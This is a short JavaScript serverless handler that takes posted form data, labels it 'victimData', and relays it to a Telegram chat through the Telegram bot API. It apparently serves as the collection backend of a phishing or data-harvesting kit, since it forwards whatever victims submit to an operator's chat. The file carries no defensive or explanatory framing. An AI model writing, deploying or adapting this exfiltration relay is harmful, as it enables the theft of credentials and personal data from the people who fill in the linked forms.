export default async function handler(req, res) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  
  if (req.method !== 'POST') {
    return res.status(405).send({ message: 'Only POST requests allowed' });
  }

  const victimData = JSON.stringify(req.body, null, 2);
  const telegramMessage = `New data received:\n\n${victimData}`;
  const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(telegramApiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: telegramMessage,
      }),
    });
    res.status(200).send({ status: 'Data forwarded' });
  } catch (error) {
    res.status(500).send({ status: 'Error forwarding data' });
  }
}
